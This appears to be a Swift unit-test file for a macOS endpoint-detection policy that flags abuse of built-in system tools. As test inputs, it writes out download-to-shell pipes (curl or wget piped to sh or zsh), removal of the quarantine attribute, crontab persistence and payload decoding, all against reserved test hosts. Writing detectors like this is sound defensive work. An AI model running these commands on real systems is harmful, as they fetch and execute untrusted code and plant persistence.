import XCTest
@testable import Nick

final class LOLBinExecutionPolicyTests: XCTestCase {
    func test_mktempTierRequiresValidatedSameChainWithoutDownloadOrQuarantine() {
        XCTAssertEqual(LOLBinExecutionPolicy.mktempTier(
            actorIdentityValidated: true,
            responsibleChainValidated: true,
            hasNetworkOrigin: false,
            hasQuarantineOrigin: false
        ), .review)
        XCTAssertEqual(LOLBinExecutionPolicy.mktempTier(
            actorIdentityValidated: true,
            responsibleChainValidated: true,
            hasNetworkOrigin: true,
            hasQuarantineOrigin: false
        ), .protected)
        XCTAssertEqual(LOLBinExecutionPolicy.mktempTier(
            actorIdentityValidated: true,
            responsibleChainValidated: true,
            hasNetworkOrigin: false,
            hasQuarantineOrigin: true
        ), .protected)
        XCTAssertEqual(LOLBinExecutionPolicy.mktempTier(
            actorIdentityValidated: false,
            responsibleChainValidated: true,
            hasNetworkOrigin: false,
            hasQuarantineOrigin: false
        ), .protected)
    }
    func test_shortLivedCurlPipeIsClassifiedAtExec() throws {
        let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
            executablePath: "/bin/sh",
            arguments: ["/bin/sh", "-c", "curl https://example.invalid/safe | /bin/sh"]
        ))
        XCTAssertEqual(finding.reason, "curl_pipe_shell")
        XCTAssertEqual(finding.severity, "critical")
        XCTAssertEqual(finding.title, "Download-to-shell command detected")
        XCTAssertEqual(finding.matchedCommand, "curl https://example.invalid/safe | /bin/sh")
    }

    func test_downloadToShellFormsRequireConcreteShellDestination() throws {
        let positives: [(String, [String])] = [
            ("/bin/zsh", ["zsh", "-c", "wget -qO- https://example.test/x | zsh"]),
            ("/bin/bash", ["bash", "-c", "$(curl -fsSL https://example.test/x)"]),
            ("/bin/zsh", ["zsh", "-lc", "curl -s https://example.test/x | sudo sh"]),
        ]
        for (path, arguments) in positives {
            XCTAssertNotNil(LOLBinExecutionPolicy.finding(executablePath: path, arguments: arguments))
        }
    }

    func test_codexLikeParentNonShellPipelinesAreNotDownloadToShellEvidence() {
        let actualSessionCommands = [
            #"rg -n "curl_pipe_shell|Move to Trash" Nick NickTests | head -240"#,
            #"rg -n "curl|wget" /Users/example/.zsh_history | tail -120"#,
            #"jq -r '.payload.input' session.jsonl | rg -i 'curl|wget'"#,
            #"shasum -a 256 fixture && rg -n 'curl' DOCS/5.0-progress.md"#,
        ]
        for command in actualSessionCommands {
            XCTAssertNil(LOLBinExecutionPolicy.finding(
                executablePath: "/bin/zsh",
                arguments: ["/bin/zsh", "-lc", command]
            ), command)
        }
    }

    func test_emptyArgumentsCannotProduceDownloadToShellFinding() {
        XCTAssertNil(LOLBinExecutionPolicy.finding(executablePath: "/bin/zsh", arguments: []))
    }

    func test_matchedCommandRedactsCommonSecrets() throws {
        let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
            executablePath: "/bin/zsh",
            arguments: ["zsh", "-c", "curl https://user:password@example.test/x?token=secret | sh"]
        ))
        XCTAssertEqual(
            finding.matchedCommand,
            "curl https://<redacted>@example.test/x?token=<redacted> | sh"
        )
    }

    func test_safeCurlAndInteractiveShellAreNotClassified() {
        XCTAssertNil(LOLBinExecutionPolicy.finding(
            executablePath: "/usr/bin/curl",
            arguments: ["curl", "-I", "https://example.com"]
        ))
        XCTAssertNil(LOLBinExecutionPolicy.finding(
            executablePath: "/bin/zsh",
            arguments: ["zsh", "-l"]
        ))
    }

    func test_xpcQuarantinePolicyRefusesProtectedSystemShell() {
        XCTAssertTrue(LOLBinExecutionPolicy.isProtectedSystemPath("/bin/zsh"))
        XCTAssertTrue(LOLBinExecutionPolicy.isProtectedSystemPath("/usr/bin/curl"))
        XCTAssertFalse(LOLBinExecutionPolicy.isProtectedSystemPath("/usr/local/bin/tool"))
    }

    func test_readOnlyXattrIsNotClassifiedButQuarantineRemovalIs() {
        XCTAssertNil(LOLBinExecutionPolicy.finding(
            executablePath: "/usr/bin/xattr",
            arguments: ["xattr", "-p", "com.apple.quarantine", "/tmp/item"]
        ))
        XCTAssertEqual(
            LOLBinExecutionPolicy.finding(
                executablePath: "/usr/bin/xattr",
                arguments: ["xattr", "-d", "com.apple.quarantine", "/tmp/item"]
            )?.reason,
            "quarantine_removal"
        )
    }

    func test_crontabPersistenceRecognizesRealArgvForms() throws {
        for arguments in [["crontab", "-"], ["crontab", "-e"], ["crontab", "/tmp/jobs"]] {
            let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
                executablePath: "/usr/bin/crontab",
                arguments: arguments
            ))
            XCTAssertEqual(finding.reason, "cron_modification")
            XCTAssertEqual(finding.title, "Added a cron job")
        }
    }

    func test_standaloneDecoderIsReviewEvidence() throws {
        for invocation in [
            ("/usr/bin/base64", ["base64", "-D", "/tmp/payload"]),
            ("/usr/bin/openssl", ["openssl", "enc", "-d", "-in", "/tmp/payload"]),
            ("/usr/bin/xxd", ["xxd", "-r", "/tmp/payload"]),
        ] {
            let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
                executablePath: invocation.0,
                arguments: invocation.1
            ))
            XCTAssertEqual(finding.reason, "encoded_payload")
            XCTAssertEqual(finding.severity, "medium")
        }
    }

    func test_quarantinedUntrustedExecutionIsReviewEvidenceWithContextualSeverity() {
        XCTAssertEqual(ExecutionTrustPolicy.quarantinedExecutionSeverity(
            hasTrustedSigner: false,
            hasQuarantineOrigin: true,
            parentIsInterpreter: false,
            parentHasNetworkSocket: false
        ), "medium")
        XCTAssertEqual(ExecutionTrustPolicy.quarantinedExecutionSeverity(
            hasTrustedSigner: false,
            hasQuarantineOrigin: true,
            parentIsInterpreter: true,
            parentHasNetworkSocket: false
        ), "high")
        XCTAssertNil(ExecutionTrustPolicy.quarantinedExecutionSeverity(
            hasTrustedSigner: true,
            hasQuarantineOrigin: true,
            parentIsInterpreter: true,
            parentHasNetworkSocket: true
        ))
        XCTAssertNil(ExecutionTrustPolicy.quarantinedExecutionSeverity(
            hasTrustedSigner: false,
            hasQuarantineOrigin: false,
            parentIsInterpreter: true,
            parentHasNetworkSocket: true
        ))
    }
}
